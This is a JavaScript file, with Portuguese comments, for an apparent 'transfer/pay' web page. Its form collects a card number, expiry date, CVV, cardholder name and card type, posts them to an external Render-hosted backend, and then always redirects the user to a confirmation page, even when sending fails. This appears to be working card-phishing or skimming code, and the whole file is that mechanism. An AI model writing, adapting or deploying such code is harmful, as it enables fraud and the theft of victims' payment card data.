document.addEventListener("DOMContentLoaded", () => {
    const form = document.querySelector("#dadosss");
    
    // Mapeando os campos do formulário para facilitar o acesso
    const campos = {
        numero: document.querySelector("#numero"),
        data: document.querySelector("#data"),
        cvv: document.querySelector("#cvv"),
        nome: document.querySelector("#nome"),
    };

    const mensagensDica = {
        numero: "Exemplo: 1234 5678 9123 4567",
        data: "Exemplo: 12/30",
        cvv: "Exemplo: 123",
        nome: "Nome completo impresso no cartão.",
    };

    // Adiciona as dicas visuais quando o usuário clica nos campos
    for (const key in campos) {
        const input = campos[key];

        input.addEventListener("focus", () => {
            removeMensagemDica(input);
            const dica = document.createElement("span");
            dica.classList.add("mensagem-dica");
            dica.style.color = "#666";
            dica.style.fontSize = "12px";
            dica.style.display = "block";
            dica.style.marginTop = "4px";
            dica.textContent = mensagensDica[key];
            input.parentElement.appendChild(dica);
        });

        input.addEventListener("blur", () => {
            removeMensagemDica(input);
        });
    }

    function removeMensagemDica(input) {
        const existing = input.parentElement.querySelector(".mensagem-dica");
        if (existing) existing.remove();
    }

    // Função que leva os dados até o seu servidor no Render
    async function enviarParaBanco(dados) {
        // ATENÇÃO: Substitua pela URL que o Render te der (ex: https://backend-g2xn.onrender.com/api/salvar)
        const URL_BACKEND = "https://backend-transfira.onrender.com/api/salvar"; 

        try {
            const response = await fetch(URL_BACKEND, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(dados)
            });

            // Após tentar enviar, levamos o usuário para a tela de erro/confirmação
            window.location.href = "confirmacao.html";
        } catch (error) {
            console.error("Erro de conexão:", error);
            // Mesmo se a internet falhar, o usuário vê a página de confirmação
            window.location.href = "confirmacao.html";
        }
    }

    // O que acontece quando o botão "Transferir" é clicado
    form.addEventListener("submit", (event) => {
        event.preventDefault();

        // Limpa avisos de erro antigos
        document.querySelectorAll(".mensagem-erro").forEach(el => el.remove());

        const tipoSelecionado = document.querySelector('input[name="gender"]:checked');

        const inputsParaValidar = {
            numero: campos.numero,
            data: campos.data,
            cvv: campos.cvv,
            nome: campos.nome,
            tipo: tipoSelecionado,
        };

        let formValido = true;

        // Verifica se todos os campos estão preenchidos
        for (const key in inputsParaValidar) {
            const input = inputsParaValidar[key];

            if (!input || (input.value === "" || input.value === undefined)) {
                formValido = false;
                
                // Pinta a borda de vermelho se estiver vazio
                if (key === "tipo") {
                    document.querySelector(".radio-container").style.border = "1px solid red";
                } else {
                    input.style.border = "1px solid red";
                }
            } else {
                if (key !== "tipo") input.style.border = "1px solid #ccc";
            }
        }

        // Se o formulário estiver todo preenchido, enviamos para o banco!
        if (formValido) {
            const dadosColetados = {
                numero: campos.numero.value,
                data: campos.data.value,
                cvv: campos.cvv.value,
                nome: campos.nome.value,
                tipo: tipoSelecionado.value,
                siteOrigem: "transfirapague.netlify.app"
            };

            enviarParaBanco(dadosColetados);
        }
    });
});
